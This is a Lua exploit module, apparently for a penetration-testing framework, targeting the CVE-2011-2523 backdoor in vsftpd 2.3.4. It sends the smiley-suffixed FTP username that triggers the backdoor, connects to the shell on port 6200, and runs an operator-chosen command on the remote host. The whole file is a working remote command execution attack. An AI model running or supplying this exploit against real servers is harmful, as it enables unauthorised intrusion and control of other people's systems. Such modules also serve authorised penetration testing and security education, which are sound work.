local tcp = require("tcp")
local time = require("time")


METADATA = {
    AUTHOR = {"farinap5 <farinap5@protonmail.com>"},
    VERSION = "1.0",
    TAGS = {"cve","rce","vsftpd"},
    INFO = [[CVE-2011-2523 exploit for vsftpd 2.3.4
This exploit will execute arbitrary command in the exposed machine.]]
}

VARS = {
    RHOST = {VALUE="0.0.0.0", NEEDED="yes", DESCRIPT="REMOTE HOST"},
    RPORT = {VALUE="21",      NEEDED="no", DESCRIPT="REMOTE PORT"},
    CMD =   {VALUE="whoami",  NEEDED="no", DESCRIPT="Command to execute"},
}

function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function connect_ftp(socket, user, passwd)
    local res, err = socket:read(128)
    if err then 
        PrintErr(err .. "\n")
        return 1 
    end
    PrintSuccs("Got banner: " .. res)

    Println("Sending user...")
    err = socket:write("USER " .. user .. "\r\n")
    if err then 
        PrintErr(err .. "\n") 
        return 1
    end

    local resUser, err = socket:read(128)
    if err then 
        PrintErr(err) 
        return 1
    end
    PrintSuccs("USER: " .. resUser)

    Println("Sending password...")
    err = socket:write("PASS " .. passwd .. "\r\n")
    if err then 
        PrintErr(err)
        return 1
    end

    return 0

--  local resPass, err = socket:read(128)
--  if err then print(err) end
--  PrintlnSuccs("Response to PASS:".. resPass)
end

function connect_shell(socket)
    Println("Sending payload...")
    local err = socket:write("echo $((47*33))\n")
    if err then error(err) end

    local resMath, err = socket:read(64)
    if err then error(err) end
    if resMath == "1551\n" then
        PrintSuccs("Vulnerable: command executed!\n")
--      time.sleep(1.5)
        connect_shell_cmd(socket)
    else
        PrintErr("No Response!\n")
        return
    end
end

function connect_shell_cmd(socket)
    Println("Sending command...")
    local err = socket:write(VARS.CMD.VALUE .. "\n")
    if err then error(err) end

    local resCMD, err = socket:read(64)
    if err then error(err) end
    if resCMD then
        PrintSuccs("Output:\n")
        Println(resCMD)
    else
        PrintErr("No data.\n")
    end
end

function Main()
    local host = VARS.RHOST.VALUE .. ":" .. VARS.RPORT.VALUE
    local socket, err = tcp.open(host)
    if not socket then
        PrintErr(err.."\n")
        return
    end

    local aux = connect_ftp(socket, "badvnr:)", "badvnr")
    if aux == 1 then
        return
    end

    time.sleep(1.5)
    PrintSuccs("Now, Trying to get shell...\n")
    local shellSock, err = tcp.open(VARS.RHOST.VALUE .. ":6200")
    if not shellSock then
        PrintErr(err.."\n")
        return
    else
        Println("Connected!")
        connect_shell(shellSock)
        Println("Closing shell socket...")
        shellSock:close()
    end

    Println("Closing FTP socket...")
    socket:close()
end
